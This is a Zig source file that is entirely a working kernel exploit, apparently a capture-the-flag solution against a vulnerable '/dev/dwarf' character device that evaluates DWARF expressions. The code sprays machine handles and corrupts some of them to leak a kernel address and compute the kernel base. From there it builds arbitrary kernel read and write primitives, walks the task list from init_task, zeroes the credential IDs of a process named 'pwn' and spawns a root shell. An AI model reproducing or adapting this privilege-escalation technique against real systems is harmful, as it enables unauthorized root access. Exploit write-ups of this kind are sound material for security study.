const std = @import("std");
const linux = std.os.linux;
const dwarf = std.dwarf;
const expresssions = dwarf.expressions;
const Builder = expresssions.Builder(.{});
const Options = expresssions.ExpressionOptions;
const OP = dwarf.OP;
const print = std.debug.print;

const Machine = struct {
    const Self = @This();
    const CREATE = 0x11;
    const RUN = 0x12;
    const DESTROY = 0x13;

    const Run = extern struct {
        idx: usize,
        ret: usize = 0,
        instructions: [0x1000]u8 = undefined,
    };

    fd: i32,
    idx: usize,

    fn create(fd: i32) Self {
        const idx = linux.ioctl(fd, CREATE, 0);
        if (@as(isize, @bitCast(idx)) < 0) {
            @panic("failed to create machine");
        }

        return .{ .fd = fd, .idx = idx };
    }

    noinline fn run(self: *const Self, instructions: []const u8) usize {
        var packet: Run = .{ .idx = self.idx };
        @memset(packet.instructions[0..packet.instructions.len], OP.nop);
        @memcpy(packet.instructions[0..instructions.len], instructions);
        _ = linux.ioctl(self.fd, RUN, @intFromPtr(&packet));
        return packet.ret;
    }
};

fn arbRead(a: Machine, b: Machine, addr: u64) !usize {
    var opcodes = [_]u8{OP.nop} ** 0x1000;
    var buffer = std.io.fixedBufferStream(&opcodes);
    const w = buffer.writer();
    try Builder.writeOpcode(w, OP.drop);
    try Builder.writeConst(w, u64, addr);
    _ = a.run(&opcodes);

    @memset(&opcodes, OP.nop);
    return b.run(&opcodes);
}

fn arbWrite(a: Machine, b: Machine, addr: u64, val: u64) !void {
    {
        var opcodes = [_]u8{OP.nop} ** 0x1000;
        var buffer = std.io.fixedBufferStream(&opcodes);
        const w = buffer.writer();
        try Builder.writeOpcode(w, OP.drop);
        try Builder.writeConst(w, u64, addr);
        _ = a.run(&opcodes);
    }

    {
        var opcodes = [_]u8{OP.nop} ** 0x1000;
        var buffer = std.io.fixedBufferStream(&opcodes);
        const w = buffer.writer();
        try Builder.writeOpcode(w, OP.drop);
        try Builder.writeConst(w, u64, val);
        _ = b.run(&opcodes);
    }
}

pub fn main() !void {
    const status = linux.open("/dev/dwarf", .{ .ACCMODE = .RDWR }, 0);
    print("fd = {}\n", .{status});
    const fd: i32 = @intCast(status);

    var handles: [0x400]Machine = undefined;

    for (0..handles.len) |i| {
        var opcodes = [_]u8{OP.nop} ** 0x1000;
        var buffer = std.io.fixedBufferStream(&opcodes);
        const w = buffer.writer();

        try Builder.writeConst(w, u64, 0x1337);
        const m = Machine.create(fd);
        _ = m.run(&opcodes);
        handles[i] = m;
    }

    print("next\n", .{});

    var i: usize = 0x300;
    while (i < handles.len) {
        const idx = i;
        var opcodes = [_]u8{OP.nop} ** 0x1000;
        var buffer = std.io.fixedBufferStream(&opcodes);
        const w = buffer.writer();
        try Builder.writeOpcode(w, OP.drop);
        try Builder.writeOpcode(w, OP.drop);
        try Builder.writeConst(w, u64, 0xfffffe0000000000);
        _ = handles[idx].run(&opcodes);
        i += 0x80;
    }

    var offset: usize = undefined;
    var reader: usize = undefined;
    var writer: usize = undefined;
    for (0..handles.len) |j| {
        var opcodes = [_]u8{OP.nop} ** 0x1000;
        const val = handles[j].run(&opcodes);
        if (val != 0 and val != 0xffffffffffffffff and val > 0xffffffff) {
            print("val[{x}] = {x}\n", .{ j, val });
            offset = (val & 0xffff) | (val >> 48 << 16);
            reader = j;
            writer = j - 0x7f;
            break;
        }
    }

    print("offset = 0x{x}\n", .{offset});
    const kbase = 0xffffffff00000000 | (offset - 0x1030);
    print("kbase  = 0x{x}\n", .{kbase});
    const init_task = kbase + 0x140c900;
    const tasks_offset = 0x4c0;
    const cred_offset = 0x768;
    const comm_offset = 0x778;
    const a = handles[writer];
    const b = handles[reader];
    var task = init_task;
    while (true) {
        const next = try arbRead(a, b, task + tasks_offset);
        task = next - tasks_offset;
        const comm = try arbRead(a, b, task + comm_offset);
        if (comm == 0x6e7770) break;
    }

    const cred = try arbRead(a, b, task + cred_offset);

    try arbWrite(a, b, cred + 0x08, 0);
    try arbWrite(a, b, cred + 0x10, 0);
    try arbWrite(a, b, cred + 0x18, 0);

    const argv: [*:null]const ?[*:0]const u8 = &.{ "/bin/sh", null };
    const envp: [*:null]const ?[*:0]const u8 = &.{null};
    _ = linux.execve("/bin/sh", argv, envp);
}
